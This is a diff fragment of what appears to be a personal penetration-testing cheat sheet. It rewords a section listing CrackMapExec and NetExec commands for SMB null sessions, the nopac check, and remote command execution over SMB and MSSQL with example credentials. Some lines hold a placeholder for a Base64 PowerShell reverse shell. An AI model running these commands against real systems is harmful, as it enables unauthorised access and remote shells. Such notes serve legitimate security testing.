@@ -144,11 +144,11 @@ nxc smb 172.16.150.20 -u '' -p '' -M nopac
 ```
 
 # CrackMapExec Commands
-As of 2024, CrackMapExec is deprecated, and I primarily use NetExec. However, there are still select cases where CrackMapExec remains useful. The following are the commands I use most frequently:
+As of 2024, CrackMapExec is deprecated, and I primarily use NetExec. However, there are still select cases where CrackMapExec remains useful. Below are the commands I use most frequently:
 ## Enumeration
 ```shell
 # Enumerating Network (Find active reachable hosts)
-nxc smb
+crackmapexec smb
 
 # Null Session (Access without Credentials)
 crackmapexec smb 172.16.150.20 -u '' -p ''
@@ -208,7 +208,8 @@ crackmapexec smb 172.16.150.20 -u john -p 'Password123!' -x "whoami"
 # MSSQL
 crackmapexec mssql 172.16.150.20 -u john -p 'Password123!' -x "whoami"
 crackmapexec mssql 172.16.150.20 -u john -p 'Password123!' -x "Enter PowerShell#3 (Base64) Reverse Shell from revshells.com here"
-# CrackMapExec version
+
+# MSSQL with Domain Parameter
 crackmapexec mssql 172.16.150.20 -d automotors.local -u john -p 'Password123!' -x "Enter PowerShell#3 (Base64) Reverse Shell from revshells.com here"
 ```
 
